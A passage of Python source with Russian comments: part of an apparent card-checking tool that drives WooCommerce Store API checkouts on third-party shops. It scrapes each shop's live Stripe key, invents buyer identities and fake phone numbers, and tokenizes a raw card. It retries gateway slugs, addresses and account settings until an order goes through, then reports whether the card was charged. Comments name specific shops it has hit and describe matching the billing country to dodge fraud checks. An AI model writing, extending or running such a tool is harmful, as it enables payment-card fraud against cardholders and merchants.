                    "amount_cents": 0, "currency": ""}

        r_prod = await s.get(f"{api}/products", params={"per_page": 30},
                             headers={"Nonce": nonce}, timeout=10)
        _log.log_http("GET", f"{api}/products", r_prod.status_code)
        _take_nonce(r_prod)  # Woo ротирует nonce в каждом ответе — подхватываем
        items = r_prod.json()
        if not isinstance(items, list) or not items:
            return {"status": "ERROR", "detail": "Store API: no products visible",
                    "amount_cents": 0, "currency": ""}
        cand = sorted(
            (p for p in items
             if p.get("prices", {}).get("price") and int(p["prices"]["price"]) > 0),
            key=lambda p: int(p["prices"]["price"]))
        if not cand:
            # ни одного товара с ценой > 0 — каталог пуст или всё бесплатно
            return {"status": "ERROR", "detail": "NO_PRODUCTS: no priced products",
                    "amount_cents": 0, "currency": ""}
        under_cap = [p for p in cand if int(p["prices"]["price"]) <= max_price_cents]
        if not under_cap:
            # D-23: «out of stock?» здесь лгал. Товаров под крышкой нет ВООБЩЕ —
            # это честное несовпадение (conferenziaworld: самый дешёвый $1499),
            # а не сломанная корзина. Разные причины — разные действия.
            return {"status": "ERROR",
                    "detail": f"NO_PRODUCT_UNDER_CAP: cheapest={cand[0]['prices']['price']}c "
                              f"cap={max_price_cents}c",
                    "amount_cents": 0,
                    "currency": cand[0].get("prices", {}).get("currency_code", "")}

        prod = None
        last_reason = "ADD_ITEM_REJECTED"
        for cand_p in under_cap:
            body = {"id": cand_p["id"], "quantity": 1}
            # D-24: variable-товар голым id не добавить — 400 missing_attributes.
            # Несем вариацию, иначе молотим один и тот же отказ по всему каталогу.
            if cand_p.get("type") == "variable":
                var = await _resolve_variation(s, api, cand_p, nonlocal_nonce, timeout=10)
                if not var:
                    last_reason = "VARIATION_REQUIRED"
                    continue
                if isinstance(var, dict):
                    if var.get("id"):
                        body["id"] = var["id"]
                    if var.get("attributes"):
                        body["variation"] = var["attributes"]
                elif isinstance(var, list):
                    body["variation"] = var
            r_add = await s.post(f"{api}/cart/add-item", json=body,
                                 headers={"Nonce": nonlocal_nonce[0],
                                          "Content-Type": "application/json"}, timeout=10)
            _log.log_http("POST", f"{api}/cart/add-item", r_add.status_code)
            _take_nonce(r_add)
            # D-22: успех доказывает форма ответа, а не код. 302→HTML-200 больше
            # не проходит как «добавилось» — иначе корзина пуста, checkout 409.
            ok, why = mutation_ok(r_add, expect_key="items")
            if ok:
                prod = cand_p
                break
            last_reason = why or f"ADD_ITEM_REJECTED(http {r_add.status_code})"
            if r_add.status_code in (401, 403, 429):
                break
        if prod is None:
            return {"status": "ERROR",
                    "detail": f"{last_reason}: tried {len(under_cap)} product(s) under cap",
                    "amount_cents": 0,
                    "currency": under_cap[0].get("prices", {}).get("currency_code", "")}
        price_c = int(prod["prices"]["price"])
        curr = prod["prices"].get("currency_code", "")

        # Если pk_live не был найден на пустой витрине — ищем его СЕЙЧАС,
        # когда товар уже в корзине (иначе Woo редиректит /checkout/ -> /cart/ без скриптов)
        if not pk or not pk.startswith("pk_live"):
            for path in ("/checkout/", "/cart/", "/checkout", "/kasse/"):
                try:
                    r_chk = await s.get(root + path, timeout=12)
                    pk = extract_pk_live(r_chk.text or "") or ""
                    if not store_lang:
                        m_lang = re.search(r'<html[^>]*lang="([a-z]{2})-', r_chk.text, re.I)
                        store_lang = (m_lang.group(1).upper() if m_lang else "")
                    if pk:
                        break
                except Exception:
                    continue
        if not pk or not pk.startswith("pk_live"):
            return {"status": "ERROR", "detail": "pk_live not found on storefront",
                    "amount_cents": price_c, "currency": curr}
        if telem is None:
            telem = stripe_telemetry(root, pk)
            telem.update(geo_identity_fields(country))

        # Физические товары: корзина требует выбранный shipping-rate, иначе
        # checkout ответит invalid_shipping_option. Rates появляются только
        # после задания destination-адреса — update-customer, затем выбор rate.
        try:
            rate_id = None
            for hop in range(2):
                r_car2 = await s.get(f"{api}/cart",
                                     headers={"Nonce": nonlocal_nonce[0]}, timeout=10)
                _take_nonce(r_car2)
                c2 = r_car2.json()
                if not c2.get("needs_shipping"):
                    break
                for grp in c2.get("shipping_rates") or []:
                    for rt in grp.get("shipping_rates") or []:
                        rate_id = rt.get("rate_id")
                        break
                    if rate_id:
                        break
                if rate_id:
                    break
                # rates пустые → задать destination-адрес и перечитать
                ident_pre = {**random_identity(country), **geo_identity_fields(country)}
                r_uc = await s.post(f"{api}/cart/update-customer",
                             json={
                                 "shipping_address": {
                                     "first_name": ident_pre["first_name"],
                                     "last_name": ident_pre["last_name"],
                                     "company": "",
                                     "address_1": ident_pre.get("line1", ""),
                                     "address_2": "",
                                     "city": ident_pre.get("city", ""),
                                     "state": ident_pre.get("state", ""),
                                     "postcode": ident_pre.get("postal_code", ""),
                                     "country": country,
                                     "phone": "",
                                 },
                             },
                             headers={"Nonce": nonlocal_nonce[0]}, timeout=10)
                _take_nonce(r_uc)
            if rate_id:
                r_sr = await s.post(f"{api}/cart/select-shipping-rate",
                             json={"rate_id": rate_id},
                             headers={"Nonce": nonlocal_nonce[0]}, timeout=10)
                _take_nonce(r_sr)
        except Exception:
            pass

        country = telem.get("country") or country
        # Гео-выравнивание по магазину: не-US витрины часто продают только по своей
        # стране — US-биллинг даёт invalid_address_country. Дефолтная страна
        # берётся из GET /checkout (draft). Падение — остаёмся на стране BIN.
        try:
            r_draft = await s.get(f"{api}/checkout",
                                   headers={"Nonce": nonlocal_nonce[0]}, timeout=10)
            _take_nonce(r_draft)
            draft = r_draft.json()
            shop_country = ((draft.get("billing_address") or {}).get("country") or "").upper()
            if not shop_country and store_lang in GEO_POOLS:
                # draft молчит о стране — берём lang витрины (magnesiumshop:
                # nl-NL витрина, US-биллинг браковался как Ongeldige parameter)
                shop_country = store_lang
            if len(shop_country) == 2 and shop_country != country:
                country = shop_country
        except Exception:
            pass

        # Полная личность для биллинга (email и т.п.) + гео-выравнивание адреса
        geo = geo_identity_fields(country)
        ident = {**random_identity(country), **geo}
        phone = f"+{random.randint(1, 9)} 555 {random.randint(100, 999)} {random.randint(1000, 9999)}"
        telem.update(geo)
        telem["first_name"] = ident["first_name"]
        telem["last_name"] = ident["last_name"]
        telem["name"] = ident["name"]
        telem["email"] = ident["email"]
        telem["phone"] = phone

        # Привязываем покупателя к корзине через update-customer:
        # Это наполняет сессию Store API валидным email, телефоном и адресом,
        # исключая ошибку 'Missing required customer field: email'
        try:
            r_uc = await s.post(f"{api}/cart/update-customer",
                                json={
                                    "billing_address": {
                                        "first_name": ident["first_name"],
                                        "last_name": ident["last_name"],
                                        "company": "",
                                        "address_1": ident["line1"],
                                        "address_2": "",
                                        "city": ident["city"],
                                        "state": ident["state"],
                                        "postcode": ident["postal_code"],
                                        "country": country,
                                        "email": ident["email"],
                                        "phone": phone,
                                    },
                                    "shipping_address": {
                                        "first_name": ident["first_name"],
                                        "last_name": ident["last_name"],
                                        "company": "",
                                        "address_1": ident["line1"],
                                        "address_2": "",
                                        "city": ident["city"],
                                        "state": ident["state"],
                                        "postcode": ident["postal_code"],
                                        "country": country,
                                        "phone": phone,
                                    },
                                },
                                headers={"Nonce": nonlocal_nonce[0]}, timeout=10)
            _take_nonce(r_uc)
        except Exception:
            pass

        # Токенизация ПОСЛЕ гео-выравнивания и с полным email/phone:
        card = parse_card(card_raw)
        tok_body = tokenize_body(card, telem, root)
        r_tok = await s.post("https://api.stripe.com/v1/payment_methods",
                             data=tok_body, headers=TOKENIZE_HEADERS, timeout=10)
        _log.log_http("POST", "https://api.stripe.com/v1/payment_methods", r_tok.status_code)
        tok_data = r_tok.json()
        if "id" not in tok_data:
            err = tok_data.get("error", {})
            _log.log_stripe("TOKENIZE_FAIL", mask_pan(card_raw), err.get("code", "error"), err.get("message", ""))
            return {"status": classify_verdict(str(err.get("message", "")) + str(err.get("code", ""))),
                    "detail": err.get("message", str(tok_data))[:200],
                    "amount_cents": price_c, "currency": curr}
        pm_id = tok_data["id"]
        _log.log_stripe("TOKENIZE_OK", pm_id, detail=mask_pan(card_raw))

        # Confirmation Token (2026 UPE Optimized Checkout support):
        ctoken_id = None
        try:
            ctok_res = await create_confirmation_token(s, pk or telem["key"], pm_id, timeout=10)
            if ctok_res.get("status") == "OK":
                ctoken_id = ctok_res.get("id")
        except Exception as _e_ct:
            _log.log_warn(f"[store_api_confirm] ctoken generation skipped: {_e_ct}")

        # D-25: слаг обязан существовать на сайте. Иначе Woo ответит
        # payment_method_disabled и схлопнет корзину — карта уже токенизирована и
        # потрачена зря. Проверяем ДО сборки тела и падаем честной причиной.
        pm_slug = _pick_pm_slug(cart_payment_methods)
        if not pm_slug:
            return {"status": "ERROR",
                    "detail": f"NO_PM_SLUG: no card-capable method in "
                              f"{cart_payment_methods[:6]}",
                    "amount_cents": price_c, "currency": curr}
        if not pm_slug_valid(cart_payment_methods, pm_slug):
            return {"status": "ERROR",
                    "detail": f"PM_SLUG_MISSING: picked '{pm_slug}', "
                              f"site offers {cart_payment_methods[:6]}",
                    "amount_cents": price_c, "currency": curr}

        payment_data = [
            {"key": "payment_method", "value": pm_slug},
            {"key": "wc-stripe-payment-method", "value": pm_id},
            {"key": "wc-stripe-payment-type", "value": "card"},
            {"key": "wc-stripe-is-deferred-intent", "value": True},
        ]
        if ctoken_id:
            payment_data.append({"key": "wc-stripe-confirmation-token", "value": ctoken_id})

        checkout_body = {
            "billing_address": {
                # ident = random_identity + гео страны магазина — все ключи гарантированы
                "first_name": ident["first_name"],
                "last_name": ident["last_name"],
                "company": "",
                "address_1": ident["line1"],
                "address_2": "",
                "city": ident["city"],
                "state": ident["state"],
                "postcode": ident["postal_code"],
                "country": country,
                "email": ident["email"],
                # Woo Blocks-checkout у части магазинов требует phone — генерим всегда
                # (555-01xx — зарезервированный диапазон, реальных абонентов нет)
                "phone": phone,
            },
            # physical-goods carts require a valid same-country shipping address;
            # часть магазинов требует phone и в shipping (IT/FR-валидаторы)
            "shipping_address": {
                "first_name": ident["first_name"],
                "last_name": ident["last_name"],
                "company": "",
                "address_1": ident["line1"],
                "address_2": "",
                "city": ident["city"],
                "state": ident["state"],
                "postcode": ident["postal_code"],
                "country": country,
                "phone": phone,
            },
            "customer_note": "", "create_account": False,
            "terms": True,  # магазины с включённым terms-чекбоксом иначе дают terms_error
            # верный slug с первого раза: cart.payment_methods знает список;
            # предпочитаем чистые card-методы (stripe_cc/stripe), wallet/local — мимо
            "payment_method": pm_slug,
            "payment_data": payment_data,
        }
        # Первый проход "stripe"; магазины с кастомными enum-именами шлюзов
        # (stripe_cc, stripe_upm, ...) ретраятся по списку из ошибки валидации
        tried = ["stripe"]
        geo_fixed = False
        addr2_fixed = False
        checkout_retried = False
        account_retried = False   # terms/guest-checkout → create_account
        shipless_retried = False  # NL-валидатор бракует адресные параметры
        cart_retried = False      # cart_empty → пересборка корзины
        for attempt in range(10):
            r_co = await s.post(f"{api}/checkout", json=checkout_body,
                                headers={"Nonce": nonlocal_nonce[0]}, timeout=20)
            _log.log_http("POST", f"{api}/checkout", r_co.status_code)
            _take_nonce(r_co)
            txt = r_co.text
            try:
                d = _json.loads(txt)
            except Exception:
                d = {}
            code = str(d.get("code") or "")
            msg_raw = str(d.get("message") or "")
            data_params = ((d.get("data") or {}).get("params")
                           if isinstance(d.get("data"), dict) else {}) or {}
            pm_err = data_params.get("payment_method", "") \
                if isinstance(data_params, dict) else ""
            # madatshop-кейс: process_payment_error «Der ausgewählte Zahlungsarten-Typ
            # ist ungültig» — неверный slug шлюза, но валидные значения в ошибке НЕ
            # перечислены. Эмитентные «card was declined» сюда не попадают (другой текст)
            pm_type_invalid = (code == "woocommerce_rest_checkout_process_payment_error"
                               and re.search(r"zahlungsarten.{0,10}typ|payment method type",
                                             msg_raw, re.I))
            if (code == "rest_invalid_param" and pm_err) or pm_type_invalid:
                # сообщение локализовано (nl/fr/de/lt...), но сами slug'и шлюзов
                # латинские — вытаскиваем их regexp'ом из всего текста ошибки
                enum = set(re.findall(
                    r"(?:stripe|ppcp|pronamic|woocommerce_payments|paypal)[a-z0-9_-]*",
                    pm_err + " " + msg_raw))
                # приоритет card-совместимых slug'ов; wallet/local-методы (alipay,
                # klarna, sepa, oxxo...) наш Stripe card-pm не примет — не перебираем
                card_plausible = ("stripe_cc", "stripe_card", "stripe_upm",
                                  "ppcp_card", "woocommerce_payments",
                                  "woocommerce_payments_card", "pronamic_pay")
                wallet_rx = re.compile(
                    r"alipay|wechat|amazon|klarna|kco|affirm|afterpay|clearpay|"
                    r"blik|eps|bancontact|boleto|ideal|oxxo|sepa|us_bank|p24|"
                    r"multibanco|link|cashapp|acss|bacs|becs|cheque|cod|giropay|"
                    r"sofort|mybank|trustly|pay_upon_invoice")
                order = sorted(
                    (e for e in enum if e and e != "stripe"
                     and not wallet_rx.search(e)),
                    key=lambda e: (e not in card_plausible,
                                   not e.startswith("stripe")))
                nxt = next((e for e in order if e not in tried), None)
                if nxt is None and pm_type_invalid:
                    # slug'ы в тексте ошибки не перечислены — перебор карточных
                    # кандидатов (наш pm_id — card PaymentMethod)
                    for cand in card_plausible:
                        if cand not in tried:
                            nxt = cand
                            break
                if nxt:
                    tried.append(nxt)
                    checkout_body["payment_method"] = nxt
                    continue
            # Гео-ретрай: Woo сам называет допустимые значения штата/провинции.
            # Формат разный: ISO-3166-2 (DE-BW), одно-двухбуквенные коды (M, SE, VI)
            # — берём первый допустимый токен из текста ошибки и перепосылаем
            addr_err = " ".join(str(v) for v in data_params.values()
                                if isinstance(v, str)) if isinstance(data_params, dict) else ""
            if code == "rest_invalid_param" and addr_err and not geo_fixed:
                iso_states = re.findall(r"\b([A-Z]{2}-[A-Z0-9]{1,3})\b", addr_err)
                after_one_of = addr_err.split("one of:")[-1] if "one of:" in addr_err else addr_err
                short_states = re.findall(r"\b([A-Z]{1,2})\b", after_one_of)
                if iso_states:
                    fixed_state = iso_states[0]
                elif short_states:
                    known_states = [s for _, s, _ in GEO_POOLS.get(country, [])]
                    match = next((st for st in short_states if st in known_states), None)
                    fixed_state = match or short_states[0]
                else:
                    fixed_state = None
                if fixed_state:
                    geo_fixed = True
                    country_for_geo = fixed_state.split("-")[0] if iso_states else country
                    matched_tuple = next((tup for tup in GEO_POOLS.get(country_for_geo, []) if tup[1] == fixed_state), None)
                    if matched_tuple:
                        new_city, new_state, new_zip = matched_tuple
                        new_geo = {
                            "line1": f"{random.randint(100, 9999)} Main Street",
                            "city": new_city,
                            "state": new_state,
                            "postal_code": new_zip,
                            "country": country_for_geo,
                        }
                    else:
                        new_geo = geo_identity_fields(country_for_geo)
                        new_geo["state"] = fixed_state
                    for side in ("billing_address", "shipping_address"):
                        addr = checkout_body.get(side) or {}
                        addr["state"] = fixed_state
                        addr["postcode"] = new_geo["postal_code"]
                        addr["city"] = new_geo["city"]
                        addr["address_1"] = new_geo["line1"]
                        if iso_states:
                            addr["country"] = country_for_geo
                    # PM ретокенизируем: биллинг PaymentMethod обязан следовать
                    # за новым адресом, иначе рассинхрон PM/checkout → fraud-отказ
                    try:
                        telem.update(new_geo)
                        r_tok2 = await s.post(
                            "https://api.stripe.com/v1/payment_methods",
                            data=tokenize_body(card, telem, root),
                            headers=TOKENIZE_HEADERS, timeout=10)
                        td2 = r_tok2.json()
                        if "id" in td2:
                            pm_id = td2["id"]
                            for pd in checkout_body.get("payment_data", []):
                                if pd.get("key") == "wc-stripe-payment-method":
                                    pd["value"] = pm_id
                    except Exception:
                        pass
                    continue
            addr_req_err = addr_err or msg_raw
            if (code in ("rest_invalid_param", "woocommerce_rest_invalid_address")
                    and not addr2_fixed and addr_req_err
                    and not checkout_body["billing_address"].get("address_2")):
                for side in ("billing_address", "shipping_address"):
                    addr = checkout_body.get(side) or {}
                    addr["address_2"] = f"Apartment {random.randint(1, 40)}"
                addr2_fixed = True
                continue
            # magnesiumshop-кейс: NL-валидатор бракует адресные параметры —
            # повторяем без shipping_address (virtual-корзине он не нужен)
            if (code == "rest_invalid_param" and not shipless_retried
                    and re.search(r"shipping_address", addr_err, re.I)):
                shipless_retried = True
                checkout_body.pop("shipping_address", None)
                continue
            # coachconnect-кейс: «You must accept the terms and conditions to
            # create an account» — магазин требует регистрацию при заказе;
            # brick-library-кейс: guest_checkout_disabled → logged in to checkout
            if (not account_retried and (
                    "terms and conditions" in msg_raw.lower()
                    or code == "woocommerce_rest_guest_checkout_disabled"
                    or "logged in to checkout" in msg_raw.lower())):
                account_retried = True
                checkout_body["create_account"] = True
                continue
            # wisdomofplanets-кейс: 409 cart_empty при живом add-item — корзина
            # потерялась между запросами; пересобираем и повторяем checkout
            if code == "woocommerce_rest_cart_empty" and not cart_retried:
                cart_retried = True
                try:
                    r_add2 = await s.post(f"{api}/cart/add-item",
                                          params={"id": prod["id"], "quantity": "1"},
                                          headers={"Nonce": nonlocal_nonce[0]}, timeout=10)
                    _take_nonce(r_add2)
                except Exception:
                    pass
                continue
            break

        async def _secrets_from(txt: str, body_dict: dict) -> list:
            """Секреты из ответа checkout: прямые + base64-редирект (#response=) + fetch order-pay."""
            secs = RE_CLIENT_SECRET.findall(txt)
            if not secs:
                pr0 = body_dict.get("payment_result") or {}
                redir0 = ""
                for det in (pr0.get("payment_details") or []):
                    if isinstance(det, dict) and det.get("key") == "redirect":
                        redir0 = str(det.get("value") or "")
                if not redir0:
                    redir0 = str(pr0.get("redirect_url") or "")
                m0 = re.search(r"#response=([A-Za-z0-9+/=_-]+)", redir0)
                if m0:
                    try:
                        import base64 as _b64
                        raw_b64 = m0.group(1)
                        pad = raw_b64 + "=" * (-len(raw_b64) % 4)
                        dec = _b64.urlsafe_b64decode(pad).decode("utf-8", "ignore")
                        secs = RE_CLIENT_SECRET.findall(dec)
                    except Exception:
                        pass
                if not secs and redir0 and ("order-pay" in redir0 or "checkout" in redir0):
                    try:
                        r_red = await s.get(redir0, timeout=10)
                        secs = RE_CLIENT_SECRET.findall(r_red.text or "")
                    except Exception:
                        pass
            return secs

        secrets = await _secrets_from(txt, d)
        pr = d.get("payment_result") or {}
        p_status = pr.get("status") or pr.get("payment_status") or ""
        details_txt = _json.dumps(pr.get("payment_details", []), ensure_ascii=False)

        # cherryarts-кейс: процессинг просит повторить («Please retry») — один
        # повтор checkout теми же данными; nonce уже свежий из прошлого ответа
        if (p_status == "failure" and not checkout_retried
                and re.search(r"please retry|try again|processing failed",
                              details_txt, re.I)):
            checkout_retried = True
            r_co = await s.post(f"{api}/checkout", json=checkout_body,
                                headers={"Nonce": nonlocal_nonce[0]}, timeout=20)
            _take_nonce(r_co)
            txt = r_co.text
            try:
                d = _json.loads(txt)
            except Exception:
                d = {}
            secrets = await _secrets_from(txt, d)
            pr = d.get("payment_result") or {}
            p_status = pr.get("status") or pr.get("payment_status") or ""
            details_txt = _json.dumps(pr.get("payment_details", []), ensure_ascii=False)

        sec_val = ""
        if secrets:
            sec_val = secrets[0][0] if isinstance(secrets[0], (tuple, list)) else str(secrets[0])
        base = {"amount_cents": price_c, "currency": curr,
                "pi_secret": sec_val}
        if p_status == "success":
            # Woo Blocks success = «заказ размещён, редирект на оплату», НЕ «деньги
            # получены» (кейс herbaura: заказ есть, PI не подтверждён, банк не тронут).
            # Единственное доказательство оплаты — статус PaymentIntent у Stripe.
            if sec_val:
                pi = await stripe_retrieve_pi(s, pk, sec_val)
                pi_st = (pi or {}).get("status") or "unreachable"
                if pi_st == "succeeded":
                    return {"status": "APPROVED@PAID",
                            "detail": f"order {d.get('order_id', '')} paid (PI succeeded)", **base}
                if pi_st in ("requires_action", "requires_source_action"):
                    return {"status": "3DS_CHALLENGE",
                            "detail": f"order {d.get('order_id', '')} 3DS required (PI={pi_st})", **base}
                if pi_st == "requires_capture":
                    return {"status": "APPROVED@HOLD",
                            "detail": f"order {d.get('order_id', '')} authorized (PI requires_capture)", **base}
                lpe = (pi or {}).get("last_payment_error") or {}
                if lpe:
                    msg = lpe.get("message") or lpe.get("code") or ""
                    return {"status": classify_verdict(msg),
                            "detail": f"order {d.get('order_id', '')} PI error: {msg}", **base}
                if pi_st == "requires_payment_method":
                    return {"status": "DECLINED",
                            "detail": f"order {d.get('order_id', '')} PI requires valid payment method", **base}
                return {"status": "PI_PENDING",
                        "detail": (f"order {d.get('order_id', '')} placed, PI={pi_st} — "
                                   f"payment NOT confirmed"), **base}
            # секрета нет → доказательства оплаты нет (herbaura-паттерн):
            # заказ размещён, PI не проверен — APPROVED@PAID не выдаём
            return {"status": "PI_PENDING",
                    "detail": f"order {d.get('order_id', '')} placed, PI secret "
                              f"not found — payment NOT confirmed", **base}
        if p_status == "failure":
            verdict = classify_verdict(details_txt + " " + str(d.get("message", "")))
            return {"status": verdict,
                    "detail": details_txt[:200] or str(d.get("message", "")), **base}
        if secrets:
            return {"status": "PI_MINTED",
                    "detail": f"client_secret in checkout response; "
                              f"payment_result.status={p_status or 'none'}", **base}
        # Woo отдаёт отказ процессинга HTTP 400 без payment_result:
        # woocommerce_rest_checkout_process_payment_error + сообщение эмитента
        msg = str(d.get("message") or "")
        code = str(d.get("code") or "")
        if "process_payment" in code or "declin" in msg.lower() or "card" in msg.lower():
            return {"status": classify_verdict(msg), "detail": msg[:200], **base}
        if code == "woocommerce_rest_guest_checkout_disabled":
            return {"status": "GUEST_CHECKOUT_DISABLED", "detail": msg[:200], **base}
        if any(term in msg.lower() for term in ("verify that you are human", "turnstile", "recaptcha", "oopspam")):
            return {"status": "CAPTCHA_CHECKOUT", "detail": msg[:200], **base}
        return {"status": "ERROR",
                "detail": f"checkout HTTP {r_co.status_code}: {code}:{msg[:120]}",
                "params": ((d.get("data") or {}).get("params")
                           if isinstance(d.get("data"), dict) else None),
                **base}
    except Exception as e:
        return {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:180],
                "amount_cents": 0, "currency": ""}
